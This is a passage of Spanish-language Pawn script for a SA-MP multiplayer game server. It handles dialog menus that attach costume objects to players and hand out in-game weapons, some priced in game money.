				format(stringo2,sizeof(stringo2),"{FF0000}*{FFFFFF} Disfraz de vaca\n{FF0000}*{FFFFFF} Disfraz de Bote de basura\n{FF0000}*{FFFFFF} Policia\n{FF0000}*{FFFFFF} Bola con forma de huevo 1\n{FF0000}*{FFFFFF} Bola con forma de huevo 2\n{FF0000}*{FFFFFF} Bola con forma de huevo 3\n{FF0000}*{FFFFFF} Armas grandes\n{FF0000}*{FFFFFF} Santa Claus\n{FF0000}*{FFFFFF} Multiples cabezas de pollo",stringo2);
				format(stringo2, sizeof stringo2, "%s\n{FF0000}*{FFFFFF} Ovni\n{FF0000}*{FFFFFF} Alien\n{FF0000}*{FFFFFF} Luz\n{FF0000}Quitar Objetos",stringo2);
				ShowPlayerDialog(playerid,Obje3,DIALOG_STYLE_LIST,"Objetos 3",stringo2,"Seleccionar","Salir");
			}
		}
	}
	if(dialogid == Obje3)
	{
		if(response)
		{
			if(listitem==0)
			{
				SetPlayerAttachedObject(playerid,0,16442,15,0.000000,0.000000,0.259000,0.000000,0.000000,-104.400001,1.000000,1.000000,1.000000);//vaca
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==1)
			{
				SetPlayerAttachedObject( playerid, 0, 1409, 1, -0.920380, 0.088453, 0.000000, 3.824895, 87.493751, 0.000000, 1.399999, 2.000000, 1.600000 );
				SetPlayerAttachedObject( playerid, 1, 19006, 1, 0.564621, 0.292698, 0.042863, 357.594757, 88.274528, 95.327667, 7.000000, 8.000000, 7.000000 );
				SetPlayerAttachedObject( playerid, 2, 19077, 1, 0.383622, 0.210077, 0.052282, 0.000000, 0.000000, 0.000000, 9.000000, 12.000000, 10.000000 );
				SetPlayerAttachedObject( playerid, 3, 336, 6, -0.348237, -0.503257, 0.314347, 0.000000, 0.000000, 0.000000, 5.000000, 5.000000, 7.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelos.");
			}
			if(listitem==2)
			{
				SetPlayerAttachedObject( playerid, 4, 18728, 3, 3.147600, -0.303776, -0.873292, 0.000000, 285.771484, 0.000000, 1.000000, 1.000000, 1.000000 );
				SetPlayerAttachedObject( playerid, 0, 19140, 2, 0.082782, 0.036745, 0.004386, 88.674697, 78.979743, 0.000000, 1.000000, 1.000000, 1.000000 );
				SetPlayerAttachedObject( playerid, 1, 19141, 2, 0.094478, 0.007213, 0.000000, 0.000000, 0.000000, 0.000000, 1.200000, 1.200000, 1.200000 );
				SetPlayerAttachedObject( playerid, 2, 19142, 1, 0.009792, 0.041990, 0.000000, 0.000000, 0.000000, 0.000000, 1.200000, 1.200000, 1.200000 );
				SetPlayerAttachedObject( playerid, 3, 355, 1, -0.067703, -0.209309, 0.147603, 0.735208, 52.436073, 4.960443, 1.299999, 1.299999, 1.299999 );
				SetPlayerSkin( playerid, 217 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelos.");
			}
			if(listitem==3)
			{
				SetPlayerAttachedObject( playerid, 1, 18843, 1, 0.000000, 0.000000, 0.000000, 360.000000, 270.000000, 0.000000, 0.020000, 0.020000, 0.029999 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelos.");
			}
			if(listitem==4)
			{
				SetPlayerAttachedObject( playerid, 1, 18844, 1, 0.000000, 0.000000, 0.000000, 360.000000, 270.000000, 0.000000, 0.020000, 0.020000, 0.029999 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==5)
			{
				SetPlayerAttachedObject( playerid, 1, 18845, 1, 0.000000, 0.000000, 0.000000, 360.000000, 270.000000, 0.000000, 0.020000, 0.020000, 0.029999 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==6)
			{
				SetPlayerAttachedObject( playerid, 0, 369, 2, -0.183602, 0.016535, -0.039228, 1.763265, 356.138977, 355.971618, 3.034477, 3.000000, 3.000000 );
				SetPlayerAttachedObject( playerid, 1, 356, 6, 0.013610, -0.021393, -0.144862, 2.354303, 354.413848, 0.219168, 3.034477, 3.000000, 3.000000 );
				SetPlayerAttachedObject( playerid, 2, 359, 1, 0.000000, -0.232854, -0.241260, 354.348602, 29.348077, 357.846679, 2.000000, 2.000000, 2.000000 );
				SetPlayerAttachedObject( playerid, 3, 363, 7, 0.176143, 0.281574, -0.120761, 79.200103, 267.183990, 337.320526, 1.200000, 1.200000, 1.200000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==7)
			{
				SetPlayerAttachedObject(playerid, 2, 19516, 2,0.050000,-0.019999,0.000000,0.000000,180.000000,-90.000000,1.299999,1.200000,1.000000);
				SetPlayerAttachedObject(playerid, 1, 19516, 2,-0.064999,0.029999,0.000000,0.000000,0.000000,90.000000,1.000000,1.299999,1.000000);
				SetPlayerAttachedObject(playerid, 1, 19516, 2,-0.064999,0.029999,0.000000,0.000000,0.000000,90.000000,1.000000,1.299999,1.000000);
				SetPlayerAttachedObject(playerid, 3, 19066, 2,0.150000,-0.009999,0.000000,-90.000000,90.000000,180.000000,1.000000,1.000000,1.000000);
				SetPlayerAttachedObject(playerid, 6, 19065, 1,-0.209999,0.000000,0.090000,180.000000,75.000000,180.000000,1.200000,3.000000,6.500000);
				SetPlayerAttachedObject(playerid, 5, 19065, 1,-0.209999,0.000000,-0.090000,0.000000,75.000000,180.000000,1.200000,3.000000,6.500000);
				SetPlayerAttachedObject(playerid, 4, 19065, 1,-0.550000,-0.200000,0.000000,90.000000,10.000000,185.000000,4.400000,3.799999,1.799999);
				SetPlayerAttachedObject(playerid, 7, 19348, 6,0.070000,0.000000,0.600000,0.898999,180.000000,-119.299003,1.200000,1.200000,1.799999);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelos.");
			}
			if(listitem==8)
			{
				SetPlayerAttachedObject(playerid, 0, 19137, 2, 0.116000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				SetPlayerAttachedObject(playerid, 1, 19137, 2, 0.392000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				SetPlayerAttachedObject(playerid, 2, 19137, 2, 0.679000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				SetPlayerAttachedObject(playerid, 3, 19137, 2, 0.948000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				SetPlayerAttachedObject(playerid, 4, 19137, 2, 1.228999, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelos.");
			}
			if(listitem==9)
			{
				SetPlayerAttachedObject( playerid, 0, 3515, 1, 0.000000, 0.000000, 0.000000, 0.000000, 270.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				SetPlayerAttachedObject( playerid, 1, 18843, 1, 0.000000, 0.000000, 0.000000, 360.000000, 270.000000, 0.000000, 0.020000, 0.020000, 0.029999 );
				SetPlayerAttachedObject( playerid, 2, 18657, 1, -1.000000, 0.000000, 0.000000, 1.000000, 90.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objetos colocados, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelos.");
			}
			if(listitem==10)
			{
				SetPlayerAttachedObject( playerid, 0, 18645, 2, 0.017478, 0.051500, 0.003912, 285.055511, 90.860740, 171.179550, 1.780549, 0.912008, 1.208514 );
				SetPlayerAttachedObject( playerid, 1, 18690, 2, -2.979508, 0.306475, -0.388553, 285.055511, 90.860740, 171.179550, 1.780549, 0.912008, 1.208514 );
				SetPlayerAttachedObject( playerid, 2, 18716, 2, -2.979508, 0.306475, -0.388553, 285.055511, 90.860740, 171.179550, 1.780549, 0.912008, 1.208514 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto Colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==11)
			{
				SetPlayerAttachedObject( playerid, 0, 354, 8, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} Objeto colocado, usa {C0C0C0}/QuitarObjetos {EAEAEA}para sacartelo.");
			}
			if(listitem==12)
			{
				for(new i;i<10;i++) RemovePlayerAttachedObject(playerid,i);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has removido todos los objetos.");
			}
		}
	}
   	if(dialogid == Armas)
	{
		if(response)
		{
			if(listitem == 0)ShowPlayerDialog(playerid, 1, DIALOG_STYLE_LIST, "Fusiles", "{FF0000}*{FFFFFF} AK-47\n{FF0000}*{FFFFFF} M-16", "Seleccionar", "Atras");
			if(listitem == 1)ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Metralletas", "{FF0000}*{FFFFFF} Tec9\n{FF0000}*{FFFFFF} Uzi\n{FF0000}*{FFFFFF} Mp5", "Seleccionar", "Atras");
			if(listitem == 2)ShowPlayerDialog(playerid, 3, DIALOG_STYLE_LIST, "Pistolas", "{FF0000}*{FFFFFF} Pistola\n{FF0000}*{FFFFFF} Pistola Silenciadora\n{FF0000}*{FFFFFF} Desert Eagle", "Seleccionar", "Atras");
			if(listitem == 3)ShowPlayerDialog(playerid, 4, DIALOG_STYLE_LIST, "Rifles", "{FF0000}*{FFFFFF} Rifle de caza\n{FF0000}*{FFFFFF} Rifle Francotirador", "Seleccionar", "Atras");
			if(listitem == 4)ShowPlayerDialog(playerid, 5, DIALOG_STYLE_LIST, "Escopetas", "{FF0000}*{FFFFFF} Escopeta\n{FF0000}*{FFFFFF} Escopeta Recortada\n{FF0000}*{FFFFFF} Escopeta De Combate", "Seleccionar", "Atras");
			if(listitem == 5)ShowPlayerDialog(playerid, 6, DIALOG_STYLE_LIST, "Granadas y Explosivos", "{FF0000}*{FFFFFF} Granadas\t\t{52C433}$1.000.000\n{FF0000}*{FFFFFF} Molotov\t\t{52C433}$1.000.000\n{FF0000}*{FFFFFF} Explosivos\t\t{52C433}$1.000.000\n{FF0000}*{FFFFFF} Granadas de humo\t{52C433}$1.000.000", "Seleccionar", "Atras");
			if(listitem == 6)ShowPlayerDialog(playerid, 7, DIALOG_STYLE_LIST, "Armas Pesadas", "{FF0000}*{FFFFFF} Bazooka\n{FF0000}*{FFFFFF} Lanza Cohetes\n{FF0000}*{FFFFFF} Minigun\n{FF0000}*{FFFFFF} Lanza Llamas", "Seleccionar", "Atras");
			if(listitem == 7)format(stringa,sizeof(stringa),"{FF0000}*{FFFFFF} Puño americano\n{FF0000}*{FFFFFF} Palo de golf\n{FF0000}*{FFFFFF} Porra de policia\n{FF0000}*{FFFFFF} Cuchillo\n{FF0000}*{FFFFFF} Bate de beisboll\n{FF0000}*{FFFFFF} Pala\n{FF0000}*{FFFFFF} Palo de billar\n{FF0000}*{FFFFFF} Katana\n{FF0000}*{FFFFFF} Motosierra\n{FF0000}*{FFFFFF} Consolador rosa\n{FF0000}*{FFFFFF} Mini consolador blanco",stringa);
			if(listitem == 7)format(stringa, sizeof stringa, "%s\n{FF0000}*{FFFFFF} Mini consolador negro\n{FF0000}*{FFFFFF} Ramo de flores\n{FF0000}*{FFFFFF} Baston",stringa);
			if(listitem == 7)ShowPlayerDialog(playerid,8,DIALOG_STYLE_LIST,"Cuerpo a Cuerpo",stringa,"Seleccionar", "Atras");
		}
	}
	if(dialogid == 1)
	{
		if(response)
		{
			if(listitem == 0)
			{
				GivePlayerWeapon(playerid,30,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}AK-47!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				GivePlayerWeapon(playerid,31,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}M-16!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			SavePlayer(playerid);
		}
		else ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
	}
	if(dialogid == 2)
	{
		if(response)
		{
			if(listitem == 0)
			{
				GivePlayerWeapon(playerid,32,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Tec9!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				GivePlayerWeapon(playerid,28,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Uzi!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
				GivePlayerWeapon(playerid,29,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Mp5!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			SavePlayer(playerid);
		}
		else ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
	}
	if(dialogid == 3)
	{
		if(response)
		{
			if(listitem == 0)
			{
				GivePlayerWeapon(playerid,22,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Pistola 9mm!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Menu De Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				GivePlayerWeapon(playerid,23,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Pistola Silenciadora!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
				GivePlayerWeapon(playerid,24,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Desert Eagle!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 3)
			{
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			SavePlayer(playerid);
		}
		else ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
	}
	if(dialogid == 4)
	{
		if(response)
		{
			if(listitem == 0)
			{
				GivePlayerWeapon(playerid,33,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Rifle de caza!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				GivePlayerWeapon(playerid,34,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Rifle de Francotirador!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			SavePlayer(playerid);
		}
		else ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
	}
	if(dialogid == 5)
	{
		if(response)
		{
			if(listitem == 0)
			{
				GivePlayerWeapon(playerid,25,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Escopeta!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				GivePlayerWeapon(playerid,26,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Escopeta Recortada!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
				GivePlayerWeapon(playerid,27,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Escopeta de Combate!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			SavePlayer(playerid);
		}
		else ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
	}
	if(dialogid == 6)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(GetPlayerMoney(playerid)<=1000000) return SendClientMessage(playerid, red, "|Error| »{FFFFFF} Debes tener {52C433}$1.000.000{FFFFFF} para usar las {919770}Granadas.");
				GivePlayerMoney(playerid, -1000000);
				GivePlayerWeapon(playerid,16,1000);
				SendClientMessage(playerid,red, "|Info| »{FFFFFF} ¡Has obtenido {919770}Granadas!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				if(GetPlayerMoney(playerid)<=1000000) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener {52C433}$1.000.000{EAEAEA} para usar las {919770}Bombas molotov.");
				GivePlayerMoney(playerid, -1000000);
				GivePlayerWeapon(playerid,18,1000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido {919770}Bombas Molotov!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
				if(GetPlayerMoney(playerid)<=1000000) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener {52C433}$1.000.000{EAEAEA} para usar los {919770}Explosivos.");
				GivePlayerMoney(playerid, -1000000);
				GivePlayerWeapon(playerid,39,1000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido {919770}Explosivos!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 3)
        	{
				if(GetPlayerMoney(playerid)<=1000000) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes tener {52C433}$1.000.000{EAEAEA} para usar las {919770}Granadas de humo.");
				GivePlayerMoney(playerid, -1000000);
				GivePlayerWeapon(playerid,17,1000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido {919770}Granadas de Humo!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			SavePlayer(playerid);
		}
		else ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
	}
	if(dialogid == 7)
	{
		if(response)
		{
			if(listitem == 0)
			{
				if(ArmasProhibidas[playerid] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el guerra deathmatch para usar esta arma.");
				GivePlayerWeapon(playerid,36,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Bazooka!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				if(ArmasProhibidas[playerid] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el guerra deathmatch para usar esta arma.");
				GivePlayerWeapon(playerid,35,1500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Lanza Cohetes!");
